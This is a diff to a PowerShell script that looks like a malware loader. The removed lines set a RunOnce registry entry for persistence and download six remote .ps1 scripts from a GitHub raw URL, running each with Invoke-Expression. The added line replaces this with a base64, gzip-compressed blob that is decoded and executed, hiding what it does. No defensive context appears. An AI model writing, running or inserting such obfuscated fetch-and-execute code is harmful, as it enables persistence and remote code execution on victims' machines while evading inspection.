@@ -1,12 +1,1 @@
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MyApp /t REG_SZ /d "$env:TEMP\run.bat" /f
-for ($i = 1; $i -le 6; $i++) {
-   
-    $url = "https://raw.githubusercontent.com/chaoss3213/ccccxxc/refs/heads/main/dc$i.ps1"
-    
-    
-    $webClient = New-Object System.Net.WebClient
-    $scriptContent = $webClient.DownloadString($url)
-    
-    
-    Invoke-Expression $scriptContent
-}
+$compressed = 'H4sIAAAAAAAA/1yQQUvzQBCG7/0VQ8ihpXSXfoXvUMlBYlGRttKoBQnIZnfSrKa7YXbSWMT/LrGI0sMMc5h5nuEl3IEyBqKbu/Qxz3zJnSLMl1aTD77kfGud8V3I05YIHT8hBetdvmnd2mmMQB5gebxsGpAMm8X1S/YM0kAUozvMHxbL+5xaJwrFEchyUHqCYWwhgekFxBYmNcL/fhqPR/AxAIC+IG6phgSiirkJcylJdWJnuWqLNiBp7xgdC+33UlfKhzD7N53JYIwxkrAMskJlgtwr66TRsRVNmEbf4N8Wd1iktUXHkMAKu8m6eEXNkB0D416skMX2Z+N0EDTZhtOTHJI/BHHlO1d7ZTIm63bD/v3Rme/WHfwbThbvDWHoEzwDDj6/AgAA///M4ZOnigEAAA=='; $bytes = [Convert]::FromBase64String($compressed); $ms = New-Object IO.MemoryStream(,$bytes); $gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr = New-Object IO.StreamReader($gz); $obfuscated = $sr.ReadToEnd(); Invoke-Expression $obfuscated
